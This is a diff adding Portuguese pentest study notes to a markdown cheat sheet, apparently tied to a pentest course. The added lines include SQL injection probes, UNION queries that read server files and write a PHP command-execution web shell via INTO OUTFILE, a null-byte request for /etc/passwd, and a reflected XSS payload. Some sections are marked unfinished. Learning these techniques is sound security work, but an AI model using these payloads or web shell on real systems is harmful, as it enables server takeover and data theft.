@@ -1390,6 +1390,35 @@ describe
 describe <table_name>;
 ```
 
+### SQL injection
+**error based** 
+```
+'
+\
+"
+```
+
+Leitura de arquivo no servidor
+```
+select * from usuarios where login='' union select 1,2,LOAD_FILE('/var/www/html/payload.php');
+```
+
+Escrita de arquivo no servidor:
+```
+select * from usuarios where login='' union select 1,2,'PAYLOAD' INTO OUTFILE '/var/www/html/payload.php';
+
+select * from usuarios where login='' union select 1,2,"<?php SYSTEM($_GET['param'])>" INTO OUTFILE '/var/www/html/payload.php';
+
+
+```
+obs: no exemplo abaixo a tabela possui 3 colunas:
+
+**Addslashes**
+exibe os caracteres em hexadecimal
+```
+echo -n 'frase qualquer' | od -An -tdC
+```
+
 ## ferramentas de fuzzing
 - gobuster
 - ffuf
@@ -1467,3 +1496,35 @@ testa os métodos http e envia arquivos para o servidor
 ```
 davtest --url <URL>
 ```
+
+
+## null byte poisoning
+caso o servidor adicione `.php` automaticamente ao final de `file`, o null byte (`%00`) interrompe o processamento da string, resultando na tentativa de carregar o arquivo `/etc/passwd` diretamente, ignorando a extensão.
+```
+GET /index.php?file=/etc/passwd%00 HTTP/1.1
+```
+FALTA FAZER
+testar o null byte com rfi
+https://academy.desecsecurity.com/novo-pentest-profissional/aula/bkt5ZVZka3RNVFEzTUE9PQ==
+## Local File Inclusion (LFI)
+infecção de logs com LFI/php
+FALTA FAZER (testar no 172.16.1.10)
+https://academy.desecsecurity.com/novo-pentest-profissional/aula/JE1DdkBjTHJNVFEyT1E9PQ==
+
+
+## XSS
+ferramenta para automatizar teste de XSS
+```
+https://github.com/s0md3v/XSStrike.git
+```
+
+### reflected
+```
+<script>alert("VULNERAVEL")<script>
+```
+payloads: https://github.com/payloadbox/xss-payload-list
+
+
+### self
+
+### stored
